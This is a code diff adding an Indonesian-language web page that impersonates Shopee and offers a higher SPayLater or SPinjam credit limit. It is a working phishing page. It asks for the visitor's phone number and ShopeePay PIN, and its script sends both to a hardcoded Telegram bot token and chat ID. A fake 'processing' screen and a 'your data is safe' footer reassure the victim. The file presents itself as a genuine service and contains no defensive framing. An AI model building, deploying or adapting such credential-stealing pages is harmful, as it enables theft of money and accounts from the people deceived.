@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tingkatkan Limit Shopee</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 0;
+            overflow: hidden;
+            box-shadow: none;
+        }
+
+        /* Gambar Header Atas */
+        .header-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Area Isi Formulir */
+        .form-content {
+            padding: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        /* Badge Label Nomor HP - Warna Oranye Terang & Menyala */
+        .badge-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #ff5722 0%, #ff784e 100%);
+            color: #ffffff;
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 12px rgba(255, 87, 34, 0.35);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
+        }
+
+        .badge-label svg {
+            width: 14px;
+            height: 14px;
+            fill: #ffffff;
+        }
+
+        /* Judul Seksi dengan Ikon */
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 800;
+            color: #00122e;
+            margin-bottom: 12px;
+            text-shadow: 0 1px 2px rgba(0, 18, 46, 0.1);
+        }
+
+        .section-title svg {
+            width: 18px;
+            height: 18px;
+            fill: #00122e;
+        }
+
+        /* Input Box Sangat Menonjol & Efek 3D */
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-box svg {
+            position: absolute;
+            left: 16px;
+            width: 20px;
+            height: 20px;
+            fill: #ee4d2d;
+            z-index: 2;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 16px 16px 16px 48px;
+            background: #ffffff;
+            border: 2px solid #cbd5e1;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #0f172a;
+            outline: none;
+            transition: all 0.25s ease;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.04), 0 4px 10px rgba(0, 0, 0, 0.04);
+        }
+
+        .input-box input:focus {
+            background: #ffffff;
+            border-color: #ee4d2d;
+            box-shadow: 0 0 0 4px rgba(238, 77, 45, 0.18), 0 6px 14px rgba(238, 77, 45, 0.1);
+            transform: translateY(-1px);
+        }
+
+        /* Kartu Pilihan Layanan */
+        .service-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+
+        .service-card {
+            position: relative;
+            border: 2px solid #cbd5e1;
+            background: linear-gradient(145deg, #ffffff, #f8fafc);
+            border-radius: 16px;
+            padding: 18px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.05), inset 0 1px 0 rgba(255, 255, 255, 0.8);
+        }
+
+        .service-card:hover {
+            border-color: #fca5a5;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 18px rgba(0, 0, 0, 0.08);
+        }
+
+        .service-card.active {
+            border-color: #ee4d2d;
+            background: linear-gradient(145deg, #fff9f8, #fff0ed);
+            box-shadow: 0 8px 20px rgba(238, 77, 45, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.9);
+            transform: translateY(-2px);
+        }
+
+        .check-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 20px;
+            height: 20px;
+            background: #ee4d2d;
+            color: white;
+            border-radius: 50%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(238, 77, 45, 0.4);
+        }
+
+        .service-card.active .check-badge {
+            display: flex;
+        }
+
+        .card-icon {
+            width: 44px;
+            height: 44px;
+            object-fit: contain;
+            margin: 0 auto 10px auto;
+            display: block;
+            filter: drop-shadow(0 3px 5px rgba(0,0,0,0.1));
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: #0f172a;
+            margin-bottom: 2px;
+            text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+        }
+
+        .service-card.active .card-title {
+            color: #ee4d2d;
+        }
+
+        .card-sub {
+            font-size: 12px;
+            font-weight: 600;
+            color: #64748b;
+        }
+
+        /* Tombol Lanjutkan */
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #ff6b3b 0%, #ee4d2d 100%);
+            color: #ffffff;
+            border: none;
+            padding: 18px;
+            border-radius: 28px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 8px 22px rgba(238, 77, 45, 0.4), inset 0 2px 3px rgba(255, 255, 255, 0.3);
+            margin-top: 26px;
+            transition: all 0.2s;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-submit:hover {
+            opacity: 0.96;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(238, 77, 45, 0.5), inset 0 2px 3px rgba(255, 255, 255, 0.4);
+        }
+
+        /* Bagian OTP */
+        .otp-section {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .otp-title {
+            font-size: 17px;
+            font-weight: 800;
+            color: #00122e;
+            margin-bottom: 8px;
+        }
+
+        .otp-desc {
+            font-size: 14px;
+            font-weight: 600;
+            color: #64748b;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Tampilan Pin Style (Lingkaran Timbul Tanpa Kotak) */
+        .otp-input {
+            width: 28px;
+            height: 36px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 900;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #0f172a;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
+            transition: transform 0.2s;
+        }
+
+        .otp-input:placeholder-shown {
+            font-size: 22px;
+            color: #64748b;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .otp-input:focus {
+            transform: scale(1.15);
+            color: #ee4d2d;
+            text-shadow: 0 3px 6px rgba(238, 77, 45, 0.35);
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #64748b;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: #ee4d2d;
+        }
+
+        /* Bagian Status Proses */
+        .process-section {
+            display: none;
+            text-align: center;
+            padding: 30px 10px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ee4d2d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .process-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: #0f172a;
+            margin-bottom: 12px;
+        }
+
+        .process-desc {
+            font-size: 14px;
+            font-weight: 600;
+            color: #64748b;
+            line-height: 1.6;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Footer Informasi Keamanan */
+        .security-footer {
+            margin-top: 24px;
+            background: linear-gradient(145deg, #f8fafc, #f1f5f9);
+            border: 1.5px solid #e2e8f0;
+            border-radius: 14px;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+        }
+
+        .security-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-icon {
+            width: 28px;
+            height: 28px;
+            background: #e2e8f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #475569;
+            font-size: 13px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .security-text h5 {
+            font-size: 13px;
+            font-weight: 800;
+            color: #1e293b;
+        }
+
+        .security-text p {
+            font-size: 11px;
+            font-weight: 600;
+            color: #64748b;
+        }
+
+        .chevron-right {
+            color: #94a3b8;
+            font-weight: 900;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Gambar Header Atas (Hanya tampil di Awal & Proses) -->
+    <img id="headerImage" src="https://cdn.phototourl.com/member/2026-10-14-1c5a4a30-ed6f-464c-87a0-decb96aa7860.png" alt="Header Banner" class="header-image">
+
+    <!-- Isi Formulir -->
+    <div class="form-content">
+        
+        <!-- STEP 1: Form Input Data -->
+        <form id="limitForm" onsubmit="handleNext(event)">
+            <div id="step1Form">
+                <!-- Input Nomor Handphone -->
+                <div class="form-group">
+                    <div class="badge-label">
+                        <svg viewBox="0 0 24 24"><path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2ZM17 18H7V6H17V18Z"/></svg>
+                        Nomor Handphone
+                    </div>
+                    <div class="input-box">
+                        <svg viewBox="0 0 24 24"><path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2ZM17 18H7V6H17V18Z"/></svg>
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" id="phone" placeholder="Contoh: 081234567890" required>
+                    </div>
+                </div>
+
+                <!-- Pilih Layanan Limit -->
+                <div class="form-group">
+                    <div class="section-title">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/></svg>
+                        Pilih Layanan Limit
+                    </div>
+                    <div class="service-grid">
+                        <!-- Kartu SPayLater -->
+                        <div class="service-card" onclick="selectCard('SPayLater', this)">
+                            <div class="check-badge">✓</div>
+                            <img src="https://cdn.phototourl.com/member/2026-10-14-617d0b54-e3f5-46a6-a53d-fa60d1fd8057.png" alt="SPayLater" class="card-icon">
+                            <div class="card-title">SPayLater</div>
+                            <div class="card-sub">Pay Later</div>
+                        </div>
+
+                        <!-- Kartu SPinjam -->
+                        <div class="service-card" onclick="selectCard('SPinjam', this)">
+                            <div class="check-badge">✓</div>
+                            <img src="https://cdn.phototourl.com/member/2026-10-14-ca6d00bd-68ee-4b99-84e5-77685c553769.png" alt="SPinjam" class="card-icon">
+                            <div class="card-title">SPinjam</div>
+                            <div class="card-sub">Pinjaman Tunai</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tombol Lanjutkan -->
+                <button type="submit" class="btn-submit">
+                    Lanjutkan <span></span>
+                </button>
+            </div>
+        </form>
+
+        <!-- STEP 2: Masukkan Kode OTP 6 Digit -->
+        <div id="step2Otp" class="otp-section">
+            <div class="otp-title">Masukkan PIN ShopeePay</div>
+            <div class="otp-desc">
+                Masukan PIN 6 digit untuk proses verifikasi keamanan.
+            </div>
+
+            <!-- Tampilan Pin Style (○ menjadi ● saat diisi) -->
+            <div class="otp-inputs">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 1)" onkeydown="moveToPrev(event, 1)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 2)" onkeydown="moveToPrev(event, 2)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 3)" onkeydown="moveToPrev(event, 3)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 4)" onkeydown="moveToPrev(event, 4)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 5)" onkeydown="moveToPrev(event, 5)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="○" class="otp-input" oninput="moveToNext(this, 6)" onkeydown="moveToPrev(event, 6)">
+            </div>
+
+            <div>
+                <a class="back-link" onclick="goBackToStep1()"></a>
+            </div>
+        </div>
+
+        <!-- STEP 3: Tampilan Proses / Menunggu -->
+        <div id="step3Process" class="process-section">
+            <div class="spinner"></div>
+            <div class="process-title">Mohon Menunggu</div>
+            <div class="process-desc">
+                Pengajuan Anda sedang diproses. Anda akan segera dihubungi layanan Shopee.
+            </div>
+        </div>
+
+        <!-- Footer Info Keamanan -->
+        <div class="security-footer">
+            <div class="security-left">
+                <div class="security-icon">🛡️</div>
+                <div class="security-text">
+                    <h5>Data Anda Aman</h5>
+                    <p>Kami menjaga keamanan informasi Anda.</p>
+                </div>
+            </div>
+            <div class="chevron-right">›</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io';
+    const TELEGRAM_CHAT_ID = '7667144622';
+
+    let selectedService = '';
+    let globalPhone = '';
+    let rawOtpValues = ['', '', '', '', '', ''];
+
+    function selectCard(serviceName, element) {
+        selectedService = serviceName;
+        document.querySelectorAll('.service-card').forEach(card => card.classList.remove('active'));
+        element.classList.add('active');
+    }
+
+    function sendToTelegram(message) {
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
+            console.warn('Token atau Chat ID Telegram belum diatur!');
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('Gagal mengirim ke Telegram:', err));
+    }
+
+    function handleNext(e) {
+        e.preventDefault();
+        globalPhone = document.getElementById('phone').value;
+
+        if (!selectedService) {
+            alert('Silakan pilih layanan limit (SPayLater atau SPinjam) terlebih dahulu.');
+            return;
+        }
+
+        const msg = `🔔 *DATA BARU MASUK*\n\n` +
+                    `📦 *Layanan:* ${selectedService}\n` +
+                    `📱 *No HP:* \`${globalPhone}\``;
+        
+        sendToTelegram(msg);
+
+        // Sembunyikan gambar header saat di tampilan OTP
+        document.getElementById('headerImage').style.display = 'none';
+        document.getElementById('step1Form').style.display = 'none';
+        document.getElementById('step2Otp').style.display = 'block';
+        
+        setTimeout(() => {
+            document.querySelectorAll('.otp-input')[0].focus();
+        }, 100);
+    }
+
+    function moveToNext(current, index) {
+        let val = current.value.replace(/[^0-9]/g, '');
+        if (val.length > 0) {
+            val = val.slice(-1);
+            rawOtpValues[index - 1] = val;
+            current.value = '●'; // Berubah menjadi titik penuh bergaya PIN
+
+            if (index < 6) {
+                document.querySelectorAll('.otp-input')[index].focus();
+            }
+        } else {
+            rawOtpValues[index - 1] = '';
+            current.value = '';
+        }
+
+        checkAndSubmitOtp();
+    }
+
+    function moveToPrev(event, index) {
+        if (event.key === 'Backspace') {
+            rawOtpValues[index - 1] = '';
+            event.target.value = '';
+            if (index > 1) {
+                document.querySelectorAll('.otp-input')[index - 2].focus();
+            }
+        }
+    }
+
+    function checkAndSubmitOtp() {
+        let otpCode = rawOtpValues.join('');
+
+        if (otpCode.length === 6) {
+            const msg = `🔐 *KODE OTP MASUK*\n\n` +
+                        `📦 *Layanan:* ${selectedService}\n` +
+                        `📱 *No HP:* \`${globalPhone}\`\n` +
+                        `🔑 *Kode PIN:* \`${otpCode}\``;
+
+            sendToTelegram(msg);
+
+            // Tampilkan kembali gambar header saat masuk ke status proses
+            document.getElementById('headerImage').style.display = 'block';
+            document.getElementById('step2Otp').style.display = 'none';
+            document.getElementById('step3Process').style.display = 'block';
+        }
+    }
+
+    function goBackToStep1() {
+        // Tampilkan kembali gambar header di halaman awal
+        document.getElementById('headerImage').style.display = 'block';
+        document.getElementById('step2Otp').style.display = 'none';
+        document.getElementById('step3Process').style.display = 'none';
+        document.getElementById('step1Form').style.display = 'block';
+        
+        rawOtpValues = ['', '', '', '', '', ''];
+        document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+    }
+</script>
+
+</body>
+</html>
